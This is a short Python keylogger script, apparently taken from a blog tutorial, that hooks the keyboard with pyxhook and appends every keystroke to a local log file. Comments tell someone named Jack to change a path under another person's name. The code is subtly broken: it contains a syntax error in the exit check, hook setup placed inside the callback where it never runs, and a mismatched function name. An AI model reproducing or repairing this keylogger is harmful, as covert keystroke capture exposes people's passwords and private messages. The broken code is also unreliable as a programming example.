#https://blog.eduonix.com/software-development/learn-create-keylogger-using-python/
import pyxhook

#seeting up the log file. Change username accordingly
log_file = '/Emily/Keylogger/Key.log' #JACK CHANGE THIS

#declar and define keystroke functions
def onKeyPress(event):      #This function is called every time a key is pressed
    fob=open(log_file,'a')   #This opens the log file in the appending mode
    fob.write(event.Key)     #This stores every keystroke into the log file
    fob.write('\n')          #Leaves the line for every key stroke

    #Function to end the application
    if event.Ascii=96:       #96 is the ascii valye of the grave key (`)
        fob.close()          #close the file
        new_hook.cancel()

    #the code below defines the hook manager
    new_hook = pyxhook.HookManager()
    #Listen to all the key strokes
    new_hook.KeyDown=OnKeyPress
    #Hook the keyboard
    new_hook.HookKeyboard()
    #start the session
    new_hook.start()

#FOR ADDITIONAL FUNCTIONALITY
#LIKE TIME OF EVENT, EVENT WINDOW NAME AND TRACKING MOUSE EVENTS:
# http://pyhook.sourceforge.net/doc_1.5.0
